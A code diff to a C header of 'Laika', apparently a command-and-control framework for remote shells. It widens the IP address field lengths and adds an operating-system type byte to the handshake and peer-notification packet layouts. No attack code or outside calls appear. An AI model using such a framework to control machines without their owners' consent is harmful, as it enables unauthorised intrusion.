@@ -9,8 +9,8 @@
 #define LAIKA_MAX_PKTSIZE 4096
 
 #define LAIKA_HOSTNAME_LEN 64
-#define LAIKA_IPV4_LEN 16
-#define LAIKA_INET_LEN 16
+#define LAIKA_IPV4_LEN 22
+#define LAIKA_INET_LEN 22
 
 #define LAIKA_SHELL_DATA_MAX_LENGTH 256
 
@@ -44,6 +44,7 @@ enum {
     *   uint8_t laikaMagic[LAIKA_MAGICLEN]; -- LAIKA_MAGIC
     *   uint8_t majorVer;
     *   uint8_t minorVer;
+    *   uint8_t osType;
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- freshly generated pubKey to encrypt decrypted nonce with
     *   char hostname[LAIKA_HOSTNAME_LEN]; -- can be empty (ie. all NULL bytes)
     *   char inet[LAIKA_INET_LEN]; -- can be empty (ie. all NULL bytes)
@@ -77,6 +78,7 @@ enum {
     *   char inet[LAIKA_INET_LEN];
     *   char ipv4[LAIKA_IPV4_LEN];
     *   uint8_t peerType;
+    *   uint8_t osType;
     */
     LAIKAPKT_AUTHENTICATED_RMV_PEER_RES, /* notification that a peer has disconnected from the cnc */
     /* layout of LAIKAPKT_AUTHENTICATED_RMV_PEER_RES
